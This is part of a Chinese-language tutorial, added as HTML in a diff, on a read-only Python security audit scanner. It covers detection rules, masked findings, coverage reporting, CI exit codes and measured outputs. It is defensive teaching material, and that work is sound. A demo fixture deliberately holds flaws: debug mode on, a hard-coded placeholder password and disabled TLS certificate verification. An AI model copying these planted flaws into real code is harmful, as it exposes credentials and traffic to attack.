+<tr>
+<td><code>files_scanned</code></td>
+<td>成功读取并解析的文件数</td>
+<td>报告里唯一能证明"真的扫了"的数字</td>
+</tr>
+<tr>
+<td><code>bytes_read</code></td>
+<td>累计读取字节</td>
+<td>异常大或异常小都提示范围不对</td>
+</tr>
+<tr>
+<td><code>skipped: {reason: n}</code></td>
+<td>跳过分类计数</td>
+<td>四类：<code>too_large</code> / <code>binary</code> / <code>not_utf8</code> / <code>symlink</code></td>
+</tr>
+<tr>
+<td><code>errors: [..]</code></td>
+<td>读取失败的文件</td>
+<td>权限问题往往出现在最需要审计的地方</td>
+</tr>
+<tr>
+<td><code>truncated</code></td>
+<td>是否达到 <code>max_files</code></td>
+<td>静默截断 = 用"没扫完"冒充"没问题"</td>
+</tr>
+<tr>
+<td><code>complete</code></td>
+<td>上述是否全空</td>
+<td>唯一的"结果可用于下结论"的开关</td>
+</tr>
+<tr>
+<td><code>gaps</code></td>
+<td>人类可读的缺口列表</td>
+<td>直接进报告的覆盖声明段</td>
+</tr>
+</tbody>
+</table>
+<h3 id="55">5.5 报告的三层结构</h3>
+<pre class="plain"><code>summary   {findings, suppressed, by_severity, by_triage_band}   ← 一眼看规模
+coverage  {files_scanned, skipped, errors, complete, gaps}      ← 结论可信度
+findings  [ {rule, severity, confidence, priority, band,
+             path, line, masked, evidence_sha256,
+             why, remediation, cwe} ]                           ← 复核依据
+</code></pre>
+<p>Markdown 渲染顺序刻意是：<strong>摘要 → 覆盖声明 → 命中明细 → 抑制清单 → 免责声明</strong>。<br>
+覆盖声明必须在明细<strong>之前</strong>，因为它决定了明细能不能被当作结论使用。</p>
+<h3 id="56">5.6 门禁退出码</h3>
+<table>
+<thead>
+<tr>
+<th>退出码</th>
+<th>含义</th>
+<th>CI 中的反应</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>无达到阈值的命中，且覆盖完整</td>
+<td>通过</td>
+</tr>
+<tr>
+<td>2</td>
+<td>用法错误 / 目标不存在</td>
+<td>修流水线配置</td>
+</tr>
+<tr>
+<td>3</td>
+<td>存在严重度 ≥ <code>--fail-on</code> 的命中</td>
+<td>派人处理，或加 baseline（需评审）</td>
+</tr>
+<tr>
+<td>4</td>
+<td>覆盖不全</td>
+<td><strong>先修工具/权限</strong>，结果暂不可信</td>
+</tr>
+</tbody>
+</table>
+<p>优先级：<code>2 &gt; 4 &gt; 3 &gt; 0</code>。把 4 排在 3 之前，是这份设计里最容易被忽略、<br>
+也最重要的一条：<strong>不可信的结果不配当门禁依据。</strong></p>
+<h3 id="57">5.7 快速开始</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="nb">cd</span><span class="w"> </span>~/code/Learn-Python
+<span class="nv">D</span><span class="o">=</span>days/day-159-security-audit-toolkit/code
+
+python3<span class="w"> </span><span class="nv">$D</span>/01-scanner-core.py<span class="w"> </span>--self-test<span class="w">      </span><span class="c1"># 规则引擎基础（内存样本）</span>
+python3<span class="w"> </span><span class="nv">$D</span>/02-report-builder.py<span class="w"> </span>--self-test<span class="w">    </span><span class="c1"># 报告生成与覆盖声明</span>
+python3<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>--self-test<span class="w">     </span><span class="c1"># CLI 整合</span>
+python3<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>rules<span class="w">           </span><span class="c1"># 查看 13 条规则</span>
+python3<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>lab<span class="w">             </span><span class="c1"># 临时目录演示项目 → 报告 + 退出码 3</span>
+python3<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>scan<span class="w"> </span>./your-project<span class="w"> </span>--fail-on<span class="w"> </span>high
+python3<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>scan<span class="w"> </span>./your-project<span class="w"> </span>--format<span class="w"> </span>json<span class="w"> </span>--output<span class="w"> </span>/tmp/audit.json
+python3<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>report<span class="w"> </span>/tmp/audit.json<span class="w"> </span>--format<span class="w"> </span>markdown
+</code></pre></div>
+<p>无第三方依赖，Python 3.10+ 即可（本仓库在 3.12 上验证）。</p>
+<h2 id="6-api">6. 定义与使用方法（API 速查）</h2>
+<h3 id="61">6.1 数据结构</h3>
+<table>
+<thead>
+<tr>
+<th>结构</th>
+<th>字段</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Rule</code></td>
+<td><code>id / title / severity / confidence / category / why / remediation / cwe / pattern / file_glob / flags</code></td>
+<td><code>frozen=True</code>；构造时校验 severity 与 confidence 合法性</td>
+</tr>
+<tr>
+<td><code>Finding</code></td>
+<td><code>rule_id / title / severity / confidence / category / cwe / path / line / masked / evidence_sha256 / why / remediation</code></td>
+<td><strong>没有 raw 字段</strong>（结构性脱敏）；<code>key</code> = <code>(rule_id, path, line)</code>；<code>band</code> 属性</td>
+</tr>
+<tr>
+<td><code>Coverage</code></td>
+<td><code>files_scanned / bytes_read / skipped / errors / truncated / complete / gaps</code></td>
+<td><code>complete</code> 与 <code>gaps</code> 是派生属性</td>
+</tr>
+<tr>
+<td><code>AuditReport</code></td>
+<td><code>root / findings / suppressed / coverage / rules_evaluated</code></td>
+<td><code>by_severity()</code> / <code>by_band()</code> / <code>at_or_above(t)</code> / <code>to_dict()</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="62">6.2 函数速查</h3>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>签名要点</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>local_rules()</code></td>
+<td><code>→ list[Rule]</code></td>
+<td>内置 13 条规则（每次返回新列表，可安全追加）</td>
+</tr>
+<tr>
+<td><code>priority(sev, conf)</code></td>
+<td><code>→ int 1..15</code></td>
+<td>triage 分值</td>
+</tr>
+<tr>
+<td><code>triage_band(sev, conf)</code></td>
+<td><code>→ 'P0'..'P3'</code></td>
+<td>分档（≥12 P0、≥8 P1、≥4 P2、其余 P3）</td>
+</tr>
+<tr>
+<td><code>mask(value, keep=4, cap=32)</code></td>
+<td><code>→ str</code></td>
+<td>脱敏；超长截断并附 <code>(len=N)</code></td>
+</tr>
+<tr>
+<td><code>fingerprint(value)</code></td>
+<td><code>→ str(16)</code></td>
+<td>SHA-256 前 16 位，跨报告比对用</td>
+</tr>
+<tr>
+<td><code>inspect_text(name, text, rules, baseline=())</code></td>
+<td><code>→ (findings, suppressed)</code></td>
+<td>审计一段文本（内存，无 IO）</td>
+</tr>
+<tr>
+<td><code>scan_path(root, rules=None, *, max_files=1000, max_bytes=1MiB, baseline=(), exclude_dirs=None, allow_symlinks=False)</code></td>
+<td><code>→ AuditReport</code></td>
+<td>只读扫描文件/目录</td>
+</tr>
+<tr>
+<td><code>dedupe(findings)</code></td>
+<td><code>→ list</code></td>
+<td>按 <code>(rule_id, path, line)</code> 去重</td>
+</tr>
+<tr>
+<td><code>summarize(report)</code></td>
+<td><code>→ str</code></td>
+<td>一行摘要（含覆盖状态）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="63-02-report-builderpy">6.3 报告层函数（<code>02-report-builder.py</code>）</h3>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>escape_md(text)</code></td>
+<td>转义 <code>|</code> 与反引号，防止文件名切碎 Markdown 表格</td>
+</tr>
+<tr>
+<td><code>sort_findings(findings)</code></td>
+<td>优先级降序 → 路径 → 行号</td>
+</tr>
+<tr>
+<td><code>load_baseline(path)</code></td>
+<td>读 baseline 文件（<code>#</code> 注释；空行忽略）</td>
+</tr>
+<tr>
+<td><code>coverage_warning(report)</code></td>
+<td>生成覆盖声明（完整时也给正面声明）</td>
+</tr>
+<tr>
+<td><code>render_markdown(report, title)</code></td>
+<td>人类可读报告</td>
+</tr>
+<tr>
+<td><code>gate_exit_code(report, fail_on)</code></td>
+<td>CI 门禁退出码 0/3/4</td>
+</tr>
+</tbody>
+</table>
+<h3 id="64-cli-03-audit-toolkitpy">6.4 CLI 速查（<code>03-audit-toolkit.py</code>）</h3>
+<table>
+<thead>
+<tr>
+<th>子命令</th>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>scan &lt;target&gt;</code></td>
+<td><code>--format {markdown,json}</code> <code>--fail-on {low,medium,high,critical}</code> <code>--baseline FILE</code> <code>--max-files N</code> <code>--max-bytes N</code> <code>--output FILE</code></td>
+<td>扫描并输出报告；退出码即门禁结果</td>
+</tr>
+<tr>
+<td><code>report &lt;report.json&gt;</code></td>
+<td><code>--format {markdown,json}</code></td>
+<td>由 JSON 重新渲染（复核人员无需重扫）</td>
+</tr>
+<tr>
+<td><code>rules</code></td>
+<td>—</td>
+<td>打印规则库（id/严重度/置信度/类别/CWE）</td>
+</tr>
+<tr>
+<td><code>lab</code></td>
+<td><code>--format</code> <code>--fail-on</code></td>
+<td>临时目录生成演示项目并扫描，退出即清理</td>
+</tr>
+<tr>
+<td><code>--self-test</code></td>
+<td>—</td>
+<td>自测，输出 <code>SELF-TEST OK</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="65-baseline">6.5 baseline 文件格式</h3>
+<pre class="plain"><code># 已知并接受的风险（需评审 + 复查日期）
+secret_hardcoded_credential:docs/notes.md      # 按&quot;规则:路径&quot;抑制
+world_writable_chmod:deploy/fix_perms.sh
+secret_cloud_access_key:1a5d44a2dca19669       # 按&quot;规则:证据指纹&quot;抑制
+</code></pre>
+<p>三种键都支持：<code>rule:path</code>、<code>rule:sha256</code>、<code>rule:path:line</code>。</p>
+<h2 id="7">7. 运行命令 + 真实预期输出（实测）</h2>
+<blockquote>
+<p>本节所有输出都是<strong>在本机真实跑出来的</strong>（Python 3.12），不是手写示意。<br>
+<code>-B</code> 表示不生成 <code>__pycache__</code>，保证"跑完不留产物"。<br>
+所有演示的临时文件都落在 <code>tempfile.TemporaryDirectory()</code> 里，<strong>不污染仓库工作树</strong>。</p>
+</blockquote>
+<h3 id="70">7.0 准备</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="nb">cd</span><span class="w"> </span>/root/code/Learn-Python
+<span class="nv">D</span><span class="o">=</span>days/day-159-security-audit-toolkit/code
+</code></pre></div>
+<h3 id="71-self-test-ok">7.1 三个脚本的自检（必跑，必须逐行输出 <code>SELF-TEST OK</code>）</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">python3<span class="w"> </span>-B<span class="w"> </span><span class="nv">$D</span>/01-scanner-core.py<span class="w"> </span>--self-test
+python3<span class="w"> </span>-B<span class="w"> </span><span class="nv">$D</span>/02-report-builder.py<span class="w"> </span>--self-test
+python3<span class="w"> </span>-B<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>--self-test
+</code></pre></div>
+<p>实测输出（三行，逐字）：</p>
+<pre class="plain"><code>SELF-TEST OK
+SELF-TEST OK
+SELF-TEST OK
+</code></pre>
+<p>自检<strong>完全离线</strong>：不联网、不读仓库外文件、不写仓库；<code>03</code> 的自检会在临时目录里搭建样例项目并扫描。</p>
+<blockquote>
+<p><code>audit_core.py</code> 是<strong>被 import 的核心库</strong>，不是 CLI 入口，它没有 <code>--self-test</code>（直接执行会静默退出 0、不输出 OK）。它的行为由上面三个脚本的断言覆盖。</p>
+</blockquote>
+<h3 id="72">7.2 规则库</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">python3<span class="w"> </span>-B<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>rules
+</code></pre></div>
+<p>实测输出：</p>
+<pre class="plain"><code>RULE                           SEV       CONF    CAT      CWE
+------------------------------------------------------------------------------
+secret_private_key             critical  high    secret   CWE-798
+secret_cloud_access_key        critical  high    secret   CWE-798
+secret_hardcoded_credential    high      medium  secret   CWE-798
+secret_bearer_jwt              medium    medium  secret   CWE-798
+config_debug_enabled           medium    high    config   CWE-489
+tls_verify_disabled            high      high    config   CWE-295
+tls_legacy_protocol            medium    high    config   CWE-327
+weak_hash_or_cipher            low       low     crypto   CWE-327
+shell_exec_enabled             medium    high    code     CWE-78
+dynamic_eval                   medium    low     code     CWE-95
+world_writable_chmod           high      medium  config   CWE-732
+insecure_package_index         medium    high    supply   CWE-494
+unpinned_dependency            low       medium  supply   CWE-1104
+
+共 13 条规则（教学基线，按业务调整）。
+</code></pre>
+<blockquote>
+<p>与 5.2 节的规则表逐行一致——<strong>规则数量、严重度、置信度、CWE 都必须和代码对得上</strong>，这是写文档时最容易失真的地方。</p>
+</blockquote>
+<h3 id="73">7.3 基础示例：内存样本 → 命中表</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">python3<span class="w"> </span>-B<span class="w"> </span><span class="nv">$D</span>/01-scanner-core.py
+</code></pre></div>
+<p>实测输出（完整）：</p>
+<pre class="plain"><code>规则数: 13  样本文件: 7
+PRI BAND SEVERITY CONF   RULE                         LOCATION                 EVIDENCE
+---------------------------------------------------------------------------------------
+ 15 P0   critical high   secret_cloud_access_key      app/legacy_client.py:1   AKIA****************
+ 12 P0   high     high   tls_verify_disabled          app/settings.py:5        veri********
+  9 P1   medium   high   config_debug_enabled         app/settings.py:2        DEBU********
+  9 P1   medium   high   shell_exec_enabled           app/settings.py:6        shel******
+  9 P1   medium   high   insecure_package_index       deploy/pip.conf:2        inde***************
+  8 P1   high     medium secret_hardcoded_credential  app/legacy_client.py:1   API_****************************
+  8 P1   high     medium secret_hardcoded_credential  app/legacy_client.py:2   TOKE********(len=67)
+  8 P1   high     medium secret_hardcoded_credential  app/settings.py:3        PASS**************************
+  8 P1   high     medium world_writable_chmod         deploy/chmod.sh:2        chmo*****
+  8 P1   high     medium secret_hardcoded_credential  docs/README.md:1         pass**********************
+  6 P2   medium   medium secret_bearer_jwt            app/legacy_client.py:2   eyJh********(len=57)
+  4 P2   low      medium unpinned_dependency          requirements.txt:1       requ****
+  3 P3   medium   low    dynamic_eval                 app/plugin_loader.py:2   eval*
+  2 P3   low      low    weak_hash_or_cipher          docs/README.md:2         ***
+
+命中合计: 14 条，抑制: 0 条
+提醒：命中只是复核线索，不是漏洞结论；文档/注释也会命中。
+</code></pre>
+<p>读这份输出时注意三处：</p>
+<ul>
+<li><code>AKIA****************</code>：保留前 4 位、其余 16 位变星号——<strong>能在日志里定位到它，但不足以还原</strong>；</li>
+<li><code>TOKE********(len=67)</code>：命中值超过 <code>cap=32</code> 就截断并附上原始长度，避免一条命中把表格撑爆；</li>
+<li>最后两行：<code>dynamic_eval</code> 来自 <code>app/plugin_loader.py</code>（低置信度提示），<code>weak_hash_or_cipher</code> 来自 <strong><code>docs/README.md</code></strong>——<strong>故意保留的纯文档误报样本</strong>，对应 4.14 的"语义反转 / 用途无害"。</li>
+</ul>
+<h3 id="74">7.4 报告生成：覆盖不全时，声明必须排在明细之前</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">python3<span class="w"> </span>-B<span class="w"> </span><span class="nv">$D</span>/02-report-builder.py
+</code></pre></div>
+<p>实测输出（节选）：</p>
+<pre class="plain"><code>findings=5 [low=2 medium=1 high=2] suppressed=0 覆盖不全
+覆盖缺口: [&#x27;skipped:binary=1&#x27;, &#x27;skipped:not_utf8=1&#x27;, &#x27;skipped:symlink=1&#x27;, &#x27;skipped:too_large=1&#x27;]
+
+# 安全审计报告（样例项目）
+
+- 目标根目录：`demo-project`（报告只保留末级目录名）
+- 评估规则数：13
+- 命中：5 条（其中被 baseline 抑制 0 条）
+- 严重度分布：low=2、medium=1、high=2
+- 优先级分布：P0=1 P1=2 P2=2 P3=0
+- 覆盖：**不全** ⚠️
+  - 缺口：skipped:binary=1、skipped:not_utf8=1、skipped:symlink=1、skipped:too_large=1
+  - 含义：上述范围内的文件**没有被检查**，本次报告不能用于得出「未发现问题」的结论。
+
+## 命中明细（按优先级排序）
+
+### [P0] tls_verify_disabled — 关闭 TLS 证书校验
+
+- 位置：`app/settings.py:3`
+- 证据：`veri********`（sha256:f069d11494dad698）
+</code></pre>
+<p>这个脚本会在临时目录里<strong>自己造出四类跳过</strong>（超大文件、二进制、非法编码、符号链接），所以 <code>complete=False</code>——<strong>这正是"0 命中 ≠ 安全"的现场演示</strong>。</p>
+<h3 id="75-lab">7.5 端到端演示：<code>lab</code>（临时目录搭建 → 扫描 → 退出码）</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">python3<span class="w"> </span>-B<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>lab<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;退出码=</span><span class="nv">$?</span><span class="s2">&quot;</span>
+</code></pre></div>
+<p>实测输出（节选）：</p>
+<pre class="plain"><code># 安全审计报告 — demo-project
+
+- 目标根目录：`demo-project`（报告只保留末级目录名）
+- 评估规则数：13
+- 命中：11 条（其中被 baseline 抑制 2 条）
+- 严重度分布：low=1、medium=4、high=4、critical=2
+- 优先级分布：P0=3 P1=6 P2=2 P3=0
+- 覆盖：完整（无跳过、无读取错误、未达到文件上限）
+
+## 命中明细（按优先级排序）
+
+### [P0] secret_cloud_access_key — 疑似云平台 Access Key
+
+- 位置：`app/legacy_client.py:1`
+- 证据：`AKIA****************`（sha256:1a5d44a2dca19669）
+</code></pre>
+<p>stderr（摘要与退出码）：</p>
+<pre class="plain"><code># findings=11 [low=1 medium=4 high=4 critical=2] suppressed=2 覆盖完整
+
+# 演示项目退出码 = 3（0=通过 3=命中达到阈值 4=覆盖不全）
+</code></pre>
+<p>退出码为 <code>3</code>。</p>
+<p>注意 <code>suppressed=2</code>：演示项目里的 <code>docs/notes.md</code>（文档占位符）与 <code>deploy/fix_perms.sh</code>（已接受的权限）被 <code>ignore.txt</code> 抑制——它们<strong>没有消失</strong>，报告里单独列出一节（见 6.5）。</p>
+<h3 id="76-json">7.6 扫描你自己的项目 → JSON 中间产物 → 重新渲染</h3>
+<p>先造一个三行的最小项目（在<strong>临时目录</strong>里，不碰仓库）：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="nv">T</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="k">)</span><span class="p">;</span><span class="w"> </span>mkdir<span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">/proj/app&quot;</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">/proj/app/settings.py&quot;</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+<span class="s">DEBUG = True</span>
+<span class="s">DB_PASSWORD = &quot;ChangeMe-Demo-123&quot;</span>
+<span class="s">requests.get(url, verify=False)</span>
+<span class="s">EOF</span>
+</code></pre></div>
+<p>扫描（Markdown 到 stdout，摘要到 stderr，退出码即门禁结果）：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">python3<span class="w"> </span>-B<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>scan<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">/proj&quot;</span><span class="w"> </span>--fail-on<span class="w"> </span>high
+</code></pre></div>
+<p>实测输出：</p>
+<pre class="plain"><code># findings=3 [medium=1 high=2] suppressed=0 覆盖完整        ← stderr 摘要
+
+# 安全审计报告 — proj
+
+- 目标根目录：`proj`（报告只保留末级目录名）
+- 评估规则数：13
+- 命中：3 条（其中被 baseline 抑制 0 条）
+- 严重度分布：medium=1、high=2
+- 优先级分布：P0=1 P1=2 P2=0 P3=0
+- 覆盖：完整（无跳过、无读取错误、未达到文件上限）
+
+## 命中明细（按优先级排序）
+
+### [P0] tls_verify_disabled — 关闭 TLS 证书校验
+
+- 位置：`app/settings.py:3`
+- 证据：`veri********`（sha256:f069d11494dad698）
+</code></pre>
+<p>落 JSON，再喂给 <code>report</code> 重新渲染（<strong>复核人员不需要重扫</strong>）：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">python3<span class="w"> </span>-B<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>scan<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">/proj&quot;</span><span class="w"> </span>--format<span class="w"> </span>json<span class="w"> </span>--output<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">/audit.json&quot;</span><span class="w"> </span>--fail-on<span class="w"> </span>high<span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;退出码=</span><span class="nv">$?</span><span class="s2">&quot;</span>
+python3<span class="w"> </span>-B<span class="w"> </span><span class="nv">$D</span>/03-audit-toolkit.py<span class="w"> </span>report<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$T</span><span class="s2">/audit.json&quot;</span><span class="w"> </span>--format<span class="w"> </span>markdown
+</code></pre></div>
+<p>实测：</p>
+<pre class="plain"><code># findings=3 [medium=1 high=2] suppressed=0 覆盖完整
+报告已写入 /tmp/tmp.wpYIie2LFJ/audit.json
+退出码=3
+</code></pre>
+<pre class="plain"><code># 安全审计报告（由 JSON 重新渲染）
+
+- 目标根目录：`proj`（报告只保留末级目录名）
+- 评估规则数：13
+- 命中：3 条（其中被 baseline 抑制 0 条）
+- 严重度分布：medium=1、high=2
+- 优先级分布：P0=1 P1=2 P2=0 P3=0
+- 覆盖：完整（无跳过、无读取错误、未达到文件上限）
+</code></pre>
+<p>JSON 结构（实测节选）：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">json</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;root&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/tmp/tmp.wpYIie2LFJ/proj&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;rules_evaluated&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="s2">&quot;secret_private_key&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="s2">&quot;secret_cloud_access_key&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="err">...</span>
+<span class="w">    </span><span class="s2">&quot;unpinned_dependency&quot;</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;summary&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;findings&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;suppressed&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;by_severity&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;info&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;low&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;medium&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;high&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;critical&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">},</span>
+<span class="w">    </span><span class="nt">&quot;by_triage_band&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;P0&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;P1&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="err">...</span>
+</code></pre></div>
+<blockquote>
+<p>⚠️ JSON 里的 <code>root</code> 是<strong>绝对路径</strong>。它是机器接口（给 CI / 工单），可以保留；但<strong>转发给人看的 Markdown 报告只保留末级目录名</strong>（<code>proj</code>）——这正是 3.2 节"报告不泄露内部拓扑"的落点。</p>
+</blockquote>
+<h3 id="77">7.7 退出码实测对照</h3>
+<table>
+<thead>
+<tr>
+<th>场景</th>
+<th>命令</th>
+<th>实测退出码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>演示项目（覆盖完整 + 有 critical/high）</td>
+<td><code>03-audit-toolkit.py lab</code></td>
+<td><strong>3</strong></td>
+</tr>
+<tr>
+<td>临时项目 <code>--fail-on high</code>（有 high 命中）</td>
+<td><code>scan "$T/proj" --fail-on high</code></td>
+<td><strong>3</strong></td>
+</tr>
+<tr>
+<td>临时项目 <code>--fail-on critical</code>（无 critical 命中）</td>
+<td><code>scan "$T/proj" --fail-on critical</code></td>
+<td><strong>0</strong></td>
+</tr>
+<tr>
+<td>样例项目（有跳过 → 覆盖不全）</td>
+<td><code>02-report-builder.py</code>（内部 <code>gate_exit_code</code> 断言）</td>
+<td>报告声明不全；门禁返回 <strong>4</strong></td>
+</tr>
+<tr>
+<td>目标不存在</td>
+<td><code>scan /nonexistent</code></td>
+<td><strong>2</strong></td>
+</tr>
+</tbody>
+</table>
+<p>优先级 <code>2 &gt; 4 &gt; 3 &gt; 0</code>：<strong>不可信的结果不配当门禁依据</strong>。</p>
+<h2 id="8">8. 实战流程（六步）</h2>
+<ol>
+<li><strong>定范围</strong>：明确审计目标的边界（哪个目录、哪个仓库、哪台机器的哪份副本），<br>
+   拿到授权记录。范围外的目录用黑名单挡住。</li>
+<li><strong>快照去噪声</strong>：优先扫描<strong>离线副本</strong>或 Git 工作区，避免扫到<br>
+<code>.venv</code>、<code>node_modules</code>、构建产物这类必定产生噪声的目录。</li>
+<li><strong>扫描</strong>：<code>scan --format json --output audit.json</code>，把 JSON 作为唯一的<br>
+   机器可信中间产物（后续 diff、归档、工单都用它）。</li>
+<li><strong>先读覆盖，再读命中</strong>：<code>coverage.complete</code> 为 false 时，<br>
+   先把 <code>gaps</code> 处理掉（提高 <code>--max-bytes</code>、补权限、缩小范围），<br>
+   再谈命中项。</li>
+<li><strong>按优先级复核</strong>：P0/P1 逐条人工确认——值是真的凭据还是示例？<br>
+   调用是否真的接收外部输入？确认后再进整改流程。</li>
+<li><strong>写 baseline 并留痕</strong>：确认为误报或已接受的，写进 baseline 文件<br>
+   （带原因与复查日期），提交进版本控制；不要用"删除规则"来消除噪音。</li>
+</ol>
+<h2 id="9">9. 常见陷阱（对照表）</h2>
+<table>
+<thead>
+<tr>
+<th>陷阱</th>
+<th>症状</th>
+<th>正确做法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>报告写绝对路径/主机名</td>
+<td>转发即泄露内部拓扑</td>
+<td>只保留末级目录名 + 相对路径</td>
+</tr>
+<tr>
+<td>打印命中的原始行</td>
+<td>明文凭据进 CI 日志</td>
+<td>只输出 <code>masked</code> + <code>evidence_sha256</code></td>
+</tr>
+<tr>
+<td>覆盖不全仍写"未发现问题"</td>
+<td>漏掉的正是问题所在</td>
+<td><code>complete == False</code> 时强制声明缺口</td>
+</tr>
+<tr>
+<td>Markdown 不转义</td>
+<td>文件名里的 <code>|</code> 切碎表格</td>
+<td>统一 <code>escape_md()</code></td>
+</tr>
+<tr>
+<td>空结果无输出</td>
+<td>分不清"没命中"和"没跑"</td>
+<td>空结果也输出摘要行</td>
+</tr>
+<tr>
+<td>baseline 直接过滤</td>
+<td>无人知道接受过多少风险</td>
+<td>抑制项单独计数并列出</td>
+</tr>
+<tr>
+<td>默认扫全盘</td>
+<td>越权 + 噪声淹没</td>
+<td>必须显式指定目标，默认黑名单</td>
+</tr>
+<tr>
+<td>用命中数考核</td>
+<td>有人会去关规则</td>
+<td>考核"高危命中确认时长 + 复发率"</td>
+</tr>
+<tr>
+<td>自动处置</td>
+<td>误报升级为生产事故</td>
+<td>发现与处置分权限，工具只读</td>
+</tr>
+</tbody>
+</table>
+<h2 id="10">10. 局限（必须写进报告，不能省略）</h2>
+<ul>
+<li><strong>纯模式匹配</strong>：看不见数据流（外部输入是否真的到达危险调用）、<br>
+  看不见运行时行为、看不见权限关系。</li>
+<li><strong>无漏洞利用验证</strong>：命中项未被证实可利用；也不判断实际影响面。</li>
+<li><strong>规则是教学基线</strong>：13 条远不及生产规则集，需按业务补充。</li>
